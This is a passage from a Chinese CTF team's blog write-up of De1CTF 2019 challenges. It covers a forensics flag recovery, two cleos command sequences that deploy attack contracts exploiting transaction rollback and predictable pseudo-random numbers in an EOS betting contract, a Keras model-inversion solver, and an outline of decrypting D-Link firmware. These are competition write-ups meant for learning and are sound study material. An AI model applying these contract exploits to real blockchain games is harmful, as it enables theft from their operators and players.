<p>想起嫌疑人的电脑装有 <code>phpStudy</code> 和 <code>Navicat</code>，直接启动 <code>mysql</code>，使用 <code>Navicat</code> 查看数据库。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/22.png" alt="22"></p>
<p>看到几个数据库的名称，与 <code>bitlocker</code> 加密盘下 <code>gambling</code> 文件夹里的几个 <code>.sql</code> 文件名一致。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/23.png" alt="23"></p>
<p>那么我们可以比较 <code>.sql</code> 文件里的数据与数据库里的数据，找到数据库 <code>tencent</code> 里多了一张表 <code>auth_secret</code> 。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/24.png" alt="24"></p>
<p>字段名为 <code>file</code>，字段值是一串 <code>base64</code> 编码字符串。</p>
<p>导出解码，转换为二进制文件，得到一个 <code>zip</code> 文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/25.png" alt="25"></p>
<p>压缩包注释里提示，“这是一个真正的flag文件”，需要找到密码解开。</p>
<p>我们用之前找到的密码 <code>F1a9ZiPInD6TABaSE</code>，解开 <code>flag.txt</code> 文件。</p>
<p><img src="https://github.com/De1ta-team/De1CTF2019/raw/master/writeup/misc/DeepInReal/img/26.png" alt="26"></p>
<p>成功找到嫌疑人隐藏的重要信息。</p>
<p>Flag：<code>de1ctf{GeT_Deep3r_1N_REAl_lifE_fOrEnIcs}</code></p>
<h2 id="Easy-EOS"><a href="#Easy-EOS" class="headerlink" title="Easy EOS"></a>Easy EOS</h2><h4 id="方法一：交易回滚攻击"><a href="#方法一：交易回滚攻击" class="headerlink" title="方法一：交易回滚攻击"></a>方法一：交易回滚攻击</h4><p>经观察，发现<code>bet action</code> 在一次交易中完成了猜数字游戏，并且发现若赢了，则users表中win的次数+1；若输了，则users表中lost的次数+1。</p>
<p>可以通过部署合约，通过<code>inline action</code>的方式，分别进行猜数字和判断。第一个<code>action</code>猜数字，第二个<code>action</code>进行判断刚刚是否赢了。若赢了，则通过；若输了，则抛出异常，使整个交易回滚。（耍赖）</p>
<p>攻击方式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置权限</span></span><br><span class="line">cleos set account permission gllrgjlqclkp active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"gllrgjlqclkp","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p gllrgjlqclkp@owner</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译合约</span></span><br><span class="line">cd attack4</span><br><span class="line">eosio-cpp -o attack4.wasm attack4.cpp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署合约</span></span><br><span class="line">cleos set contract gllrgjlqclkp . -p gllrgjlqclkp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 调用makebet方法多次，直到账号win次数大于等于10</span></span><br><span class="line">cleos push action gllrgjlqclkp makebet '[]' -p gllrgjlqclkp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 请求发送flag</span></span><br><span class="line">cleos push action de1ctftest11 sendmail '["gllrgjlqclkp", "xxxx@qq.com"]' -p gllrgjlqclkp@active</span><br></pre></td></tr></table></figure>
<h4 id="方法二：伪随机数攻击"><a href="#方法二：伪随机数攻击" class="headerlink" title="方法二：伪随机数攻击"></a>方法二：伪随机数攻击</h4><p>经过反编译得到伪随机数产生的算法，部署相应的合约，在一次交易中，计算将要产生的随机数，然后用该随机数调用目标合约的<code>bet action</code>。</p>
<p>攻击方式</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 设置权限</span></span><br><span class="line">cleos set account permission btdaciaibmfp active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS7fyKcyPhP5P4S5xXqLzYEFg5bYuYRvxzsX3UJ5W7vAxvXtgYAU","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"btdaciaibmfp","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p btdaciaibmfp@owner</span><br><span class="line"><span class="meta">#</span><span class="bash"> 编译合约</span></span><br><span class="line">cd attack</span><br><span class="line">eosio-cpp -o attack.wasm attack.cpp</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署合约</span></span><br><span class="line">cleos set contract btdaciaibmfp . -p btdaciaibmfp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 调用makebet方法10次</span></span><br><span class="line">cleos push action btdaciaibmfp makebet '[]' -p btdaciaibmfp@active</span><br><span class="line"><span class="meta">#</span><span class="bash"> 请求发送flag</span></span><br><span class="line">cleos push action de1ctftest11 sendmail '["btdaciaibmfp", "xxxxxx@gmail.com"]' -p btdaciaibmfp@active</span><br></pre></td></tr></table></figure>
<h2 id="DeepEncrypt"><a href="#DeepEncrypt" class="headerlink" title="DeepEncrypt"></a>DeepEncrypt</h2><h4 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h4><p>如今机器学习以及深度学习在各个领域广泛应用，包括医疗领域、金融领域、网络安全领域等等。深度学习需要大量的训练数据作为支持，然而如何保证训练的数据的安全性是值得我们考虑的。现在提出了许多基于深度学习模型的<a href="https://www.cs.cmu.edu/~mfredrik/papers/fjr2015ccs.pdf" target="_blank" rel="noopener">模型逆向攻击</a>，来对用户的数据进行窃取。</p>
<p>本题模拟了一种基于深度学习的模型，对一些用户数据（flag）进行一系列的处理之后生成“加密”之后的数据，让选手使用提供的数据，训练解密模型，获取原始的flag。</p>
<h4 id="赛题流程"><a href="#赛题流程" class="headerlink" title="赛题流程"></a>赛题流程</h4><h4 id="提供文件："><a href="#提供文件：" class="headerlink" title="提供文件："></a>提供文件：</h4><ul>
<li>flag_sample.txt :用于训练的flag样本。</li>
<li>enc_sample.txt :用于训练的加密之后的flag样本。</li>
<li>enc.hdf5: 基于keras训练的flag加密模型。</li>
<li>flag_enc.txt: 选手需要解密的flag (flag in server-&gt; enc.hdf5-&gt; flag_enc.txt)<h4 id="提供接口："><a href="#提供接口：" class="headerlink" title="提供接口："></a>提供接口：</h4>用于给选手提交解密之后的flag，和真实flag进行对比，误差小于0.2（可以减小误差要求，增加难度）即可通过，给出真实flag。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">flag = np.loadtxt(<span class="string">"../data/flag.txt"</span>)</span><br><span class="line">true_flag = <span class="string">"de1ctf&#123;xxx_xxx_xxx&#125;"</span></span><br><span class="line">threshold=<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mse</span><span class="params">(true, predict)</span>:</span></span><br><span class="line">    loss = np.average(np.abs(true - predict))</span><br><span class="line">    print(loss)</span><br><span class="line">    <span class="keyword">return</span> loss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(predict)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> mse(flag, predict) &lt; threshold:</span><br><span class="line">        print(true_flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"You can't fool me"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    inp = input(<span class="string">"Input your flag_dec result:"</span>)</span><br><span class="line">    inp = np.asarray(inp.split(<span class="string">' '</span>), dtype=float)</span><br><span class="line">    judge(inp)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><p>利用AutoEncoderDecoder思路，利用所给的Enc模型，训练解密模型。</p>
<p>可以直接运行<code>python solve.py</code>，结果在flag_dec.txt中，直接复制到到云服务器上进行检验，底下也有已经通过解密的结果。（可能要跑几次才能出结果，所以我测试的时候用的是本地测试）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">requirements</span><br><span class="line"></span><br><span class="line">keras</span><br><span class="line">sklearn</span><br><span class="line">numpy</span><br></pre></td></tr></table></figure>
<p>Dec model:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Layer (type)</th>
<th style="text-align:center">Output Shape</th>
<th style="text-align:center">Param</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">input_1 (InputLayer)</td>
<td style="text-align:center">(None, 64)</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">dense_1 (Dense)</td>
<td style="text-align:center">(None, 2048)</td>
<td style="text-align:center">133120</td>
</tr>
<tr>
<td style="text-align:center">dense_2 (Dense)</td>
<td style="text-align:center">(None, 2048)</td>
<td style="text-align:center">4196352</td>
</tr>
<tr>
<td style="text-align:center">dense_3 (Dense)</td>
<td style="text-align:center">(None, 128)</td>
<td style="text-align:center">262272</td>
</tr>
</tbody>
</table>
<p>Total params: 4,591,744</p>
<p>Trainable params: 4,591,744</p>
<p>Non-trainable params: 0</p>
<hr>
<p>AutoEncoderDecoder：</p>
<table>
<thead>
<tr>
<th style="text-align:center">Layer (type)</th>
<th style="text-align:center">Output Shape</th>
<th style="text-align:center">Param</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Enc (Model)</td>
<td style="text-align:center">(None, 64)</td>
<td style="text-align:center">8256</td>
</tr>
<tr>
<td style="text-align:center">Dec (Model)</td>
<td style="text-align:center">(None, 128)</td>
<td style="text-align:center">4591744</td>
</tr>
</tbody>
</table>
<p>Total params: 4,600,000</p>
<p>Trainable params: 4,591,744</p>
<p>Non-trainable params: 8,256<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_model</span><span class="params">(enc_shape, flag_shape)</span>:</span></span><br><span class="line">    inp = Input((enc_shape,))</span><br><span class="line">    h = Dense(<span class="number">2048</span>)(inp)</span><br><span class="line">    h = Dense(<span class="number">2048</span>)(h)</span><br><span class="line">    out = Dense(flag_shape, activation=<span class="string">'sigmoid'</span>)(h)</span><br><span class="line">    <span class="keyword">return</span> Model(inp, out)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">(flag_name, enc_name)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param path: data path</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        flag_sample: shape=(512,128)</span></span><br><span class="line"><span class="string">        enc_sample:shape=(512,64)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    flag_sample = np.loadtxt(flag_name)</span><br><span class="line">    enc_sample = np.loadtxt(enc_name)</span><br><span class="line">    <span class="keyword">return</span> flag_sample, enc_sample</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_dec</span><span class="params">(flag_sample, enc_sample)</span>:</span></span><br><span class="line">    flag_shape = flag_sample.shape[<span class="number">-1</span>]</span><br><span class="line">    enc_shape = enc_sample.shape[<span class="number">-1</span>]</span><br><span class="line">    Enc_model = load_model(<span class="string">"../model/enc.hdf5"</span>)</span><br><span class="line">    Enc_model.name = <span class="string">"Enc"</span></span><br><span class="line">    Dec_model = dec_model(enc_shape, flag_shape)</span><br><span class="line">    print(<span class="string">"Train Dec_model"</span>)</span><br><span class="line">    Enc_model.trainable = <span class="keyword">False</span></span><br><span class="line">    inp = Enc_model.inputs</span><br><span class="line">    dec = Enc_model(inp)</span><br><span class="line">    out = Dec_model(dec)</span><br><span class="line">    model = Model(inp, out)</span><br><span class="line">    model.compile(loss=<span class="string">'mean_absolute_error'</span>, optimizer=<span class="string">'Adam'</span>)</span><br><span class="line">    print(model.summary())</span><br><span class="line">    ear = EarlyStopping(monitor=<span class="string">'val_loss'</span>, patience=<span class="number">10</span>, mode=<span class="string">'min'</span>, restore_best_weights=<span class="keyword">True</span>)</span><br><span class="line">    model.fit(flag_sample, flag_sample, batch_size=<span class="number">512</span>, epochs=<span class="number">100000000</span>, verbose=<span class="number">2</span>, validation_split=<span class="number">0.1</span>,</span><br><span class="line">              callbacks=[ear])</span><br><span class="line">    print(Dec_model.summary())</span><br><span class="line">    Dec_model.save(dec_loss0<span class="number">.177</span>.hdf5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    Dec_model = load_model(dec_loss0<span class="number">.177</span>.hdf5)</span><br><span class="line">    flag_enc = np.loadtxt(<span class="string">"../data/flag_enc.txt"</span>).reshape(<span class="number">1</span>, <span class="number">-1</span>)</span><br><span class="line">    flag_dec = Dec_model.predict(flag_enc)</span><br><span class="line">    np.savetxt(<span class="string">"../data/flag_dec.txt"</span>, flag_dec)</span><br><span class="line">    <span class="comment"># print(flag_dec[0])</span></span><br><span class="line">    judge(flag_dec[<span class="number">0</span>])</span><br></pre></td></tr></table></figure></p>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>loss: 0.17741050019098772</p>
<p>delta{xxx_xxx_xxx}</p>
<p>flag: </p>
<blockquote>
<p>1 0 1 1 1 1 0 1 1 1 0 1 0 0 0 1 0 1 1 1 1 1 1 1 1 0 0 0 0 1 0 1 1 0 1 0 0 0 1 0 0 0 1 0 1 0 0 0 1 1 1 0 1 1 0 1 1 0 0 0 0 1 1 0 0 1 1 0 0 0 0 1 1 1 1 0 0 1 0 0 0 0 0 1 1 0 0 1 1 1 1 0 1 0 1 1 1 1 0 0 0 1 1 0 0 1 1 0 0 0 1 1 1 1 0 0 1 0 0 1 1 1 0 1 1 1 0 0</p>
</blockquote>
<p>flag_enc:</p>
<blockquote>
<p>-4.286013841629028320e-01 9.896190166473388672e-01 4.559664130210876465e-01 8.176887035369873047e-01 8.356271386146545410e-01 3.765194416046142578e-01 1.687297374010086060e-01 3.029667437076568604e-01 5.969925522804260254e-01 5.114848613739013672e-01 9.926454722881317139e-02 9.131879210472106934e-01 -2.152046710252761841e-01 8.866041898727416992e-02 3.317154347896575928e-01 9.851776361465454102e-01 7.276151180267333984e-01 8.283065557479858398e-01 1.823632977902889252e-03 3.699933588504791260e-01 6.979680061340332031e-02 1.828217357397079468e-01 5.757516622543334961e-01 1.914786100387573242e-01 3.244600296020507812e-01 1.111515283584594727e+00 5.159097313880920410e-01 1.231751441955566406e-01 -3.645407259464263916e-01 7.166512608528137207e-01 1.389274299144744873e-01 7.724004983901977539e-02 7.178838849067687988e-01 -9.603453427553176880e-02 5.028448104858398438e-01 3.499638140201568604e-01 8.395515680313110352e-01 6.976196765899658203e-01 2.593761086463928223e-01 7.141951918601989746e-01 6.022385954856872559e-01 1.001740217208862305e+00 -2.897696197032928467e-01 1.448748558759689331e-01 8.408914208412170410e-01 2.470737695693969727e-01 4.430454969406127930e-01 -2.019447684288024902e-01 8.161327838897705078e-01 2.832469642162322998e-01 6.612138748168945312e-01 9.899861216545104980e-01 2.219144105911254883e-01 1.322134375572204590e+00 7.497617006301879883e-01 9.182292222976684570e-01 6.070237755775451660e-01 3.877772092819213867e-01 3.660472482442855835e-02 7.972034811973571777e-01 -2.158393338322639465e-02 5.925227403640747070e-01 5.734952688217163086e-01 -5.487446486949920654e-02</p>
</blockquote>
<p>flag_dec:</p>
<blockquote>
<p>9.999969005584716797e-01 1.000000000000000000e+00 1.000000000000000000e+00 8.216343522071838379e-01 1.000000000000000000e+00 2.449917824165481761e-09 4.793806410857692768e-13 9.827108979225158691e-01 1.000000000000000000e+00 9.518706798553466797e-01 4.392772812167322627e-09 6.113789975643157959e-03 4.152511974098160863e-05 4.196180736215637808e-09 7.207927703857421875e-01 2.705646342008542066e-14 6.214135623849870171e-07 9.999998807907104492e-01 9.499107003211975098e-01 1.000000000000000000e+00 1.000000000000000000e+00 1.000000000000000000e+00 1.000000000000000000e+00 1.000000000000000000e+00 9.999998807907104492e-01 1.134839401270570924e-12 1.000000000000000000e+00 1.000000000000000000e+00 1.772474402327793816e-22 9.627295136451721191e-01 8.082498652584035881e-07 5.288467742502689362e-03 1.000000000000000000e+00 1.356615761025602163e-14 9.699743986129760742e-01 9.680391289293766022e-03 1.000000000000000000e+00 3.494189800782449007e-13 1.000000000000000000e+00 3.159084932123808198e-14 2.154111511019039804e-14 5.770184313065346467e-16 1.000000000000000000e+00 1.002021781459916383e-05 9.999998807907104492e-01 8.955678204074501991e-04 1.000000000000000000e+00 9.489459000600186244e-18 8.299213051795959473e-01 9.961280226707458496e-01 9.470678567886352539e-01 1.103274103880202014e-22 1.000000000000000000e+00 6.979074478149414062e-01 2.365609405194221800e-20 1.000000000000000000e+00 1.000000000000000000e+00 1.236146737271584528e-13 6.457178387790918350e-04 5.910291671752929688e-01 9.847130749696120233e-11 1.000000000000000000e+00 2.832969698829401750e-07 3.806088219523060032e-21 4.788258164282160009e-21 1.000000000000000000e+00 1.000000000000000000e+00 9.999659061431884766e-01 6.373043248686371953e-08 9.844582080841064453e-01 1.429801388397322626e-09 9.504914879798889160e-01 9.991403818130493164e-01 2.418865845658057272e-19 1.000000000000000000e+00 2.270782504153226976e-17 2.376812939172689987e-12 1.000000000000000000e+00 1.241249365389798104e-14 1.346701979637145996e-01 3.604641086571485015e-16 3.174040572003981712e-17 2.682143889551155425e-18 1.000000000000000000e+00 1.000000000000000000e+00 1.364883929491043091e-01 4.823155208555363060e-09 8.947684168815612793e-01 4.979012906551361084e-02 9.936627149581909180e-01 1.000000000000000000e+00 6.171471613924950361e-05 1.000000000000000000e+00 3.350817401326366962e-10 9.962311387062072754e-01 8.754302263259887695e-01 1.577300601240949618e-08 1.000000000000000000e+00 8.513422443141155371e-14 1.534198522347082760e-13 4.049778076177301201e-16 5.455599006151120746e-18 8.422639439231716096e-06 6.625648587942123413e-02 2.438588886377601739e-09 1.000000000000000000e+00 1.000000000000000000e+00 3.147949101389713178e-08 7.443545779750593283e-11 7.562025007915029740e-13 9.984059929847717285e-01 1.000000000000000000e+00 1.000000000000000000e+00 9.997273981571197510e-02 6.106127430939578549e-13 4.462333163246512413e-05 9.999997615814208984e-01 1.432137628991099035e-24 9.999928474426269531e-01 1.000000000000000000e+00 2.727753134479371511e-09 1.000000000000000000e+00 2.289682043965513003e-07 9.587925076484680176e-01 9.999778270721435547e-01 1.000000000000000000e+00 1.434007310308516026e-03 7.365300120909523685e-07</p>
</blockquote>
<h2 id="Upgrade"><a href="#Upgrade" class="headerlink" title="Upgrade"></a>Upgrade</h2><p>出这个类型的题，主要是考察选手对加密固件的提取，题目涉及的是DIR-850L固件的真实加解密，也是希望选手在做了题之后有所收获，能够在真实设备上做进一步的漏洞挖掘</p>
<p>这道题有两个预期解，一是直接通过逆向升级的部分编写解密脚本，加密不是很难，已给出了AES所需的key，对设备有一些研究的在看了这个cgi-bin之后通常都能猜到是哪些型号，所以我patch掉了一些信息；二是巧解，在固件升级的过程中他可以直接调用解密程序对固件解密，所以需要qemu运行一个同架构的虚拟机，然后调用解密程序解出来</p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/de1ctf/">#de1ctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/08/de1ctf2019 Writeup/">De1ctf 2019 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/06/24/sctf2019/">SCTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>